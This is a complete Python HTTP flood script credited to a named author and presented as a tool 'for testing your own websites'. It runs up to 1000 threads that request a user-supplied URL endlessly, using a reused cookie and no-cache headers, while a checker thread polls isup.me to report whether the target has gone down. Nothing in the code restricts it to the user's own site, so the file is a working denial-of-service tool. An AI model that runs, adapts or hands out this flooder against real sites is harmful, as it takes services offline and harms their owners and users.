# -*- coding: utf-8 -*-
# Script created for testing your own websites
# by Alexey Privalov | www.alex0007.ru

import string
import threading
import urllib.parse
import urllib.request
import time
import random
import sys

# Global parameters
thread_limit = 1000  # Number of threads
user_agent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1734.5 Safari/537.36"
# Global parameters end


class Flooder(threading.Thread):
    global user_agent

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        try:
            while True:
                q1 = str(round(random.uniform(0.5, 0.7), 1))
                q2 = str(round(random.uniform(0.7, 1), 1))
                cur_header = {
                    "Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain; q=" + q1 + ", text/html, "
                              "text/x-dvi; q=" + q2 + "; mxb=100000, text/x-c",
                    "Connection": "Keep-Alive",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                    "User-agent": user_agent,
                    "Cookie": cookie,
                    "Accept-Encoding": "gzip;q=1.0, identity; q=0.5, *;q=0"
                }
                req = urllib.request.Request(str_target, headers=cur_header)
                urllib.request.urlopen(req, timeout=60000)
        except:
            pass


class Checker(threading.Thread):
    current_sec = None

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while True:
            if time.localtime().tm_sec % 15 == 0 and self.current_sec != time.localtime().tm_sec:
                self.current_sec = time.localtime().tm_sec
                try:
                    req = urllib.request.Request("http://isup.me/"+target.netloc+target.path)
                    if urllib.request.urlopen(req).read().decode().find("It's just you") > 0:
                        status = "up"
                    else:
                        status = "down"
                    print("The website is", status)
                except:
                    print("Can't check website status")

#  some input url preparations
if len(sys.argv) == 2:
    target = sys.argv[1]
else:
    print('Enter target url or IP ( e.g. "http://google.com" or "http://195.208.0.133"):')
    target = input()

target = urllib.parse.urlparse(target)
if target.netloc.__len__() == 0:
    print("Incorrect url input")
    exit()
str_target = target.scheme+"://"+target.netloc+target.path+target.params
if target.path.__len__() ==0:
    str_target = str_target + "/"
#  preparations ended

#  getting cookies
req = urllib.request.Request(str_target)
resp = urllib.request.urlopen(req)
cookie = resp.headers['Set-Cookie']
#  end cookies getting

print("Flooding %s" % str_target)
Checker().start()
while True:
    if threading.active_count() <= thread_limit:
        Flooder().start()
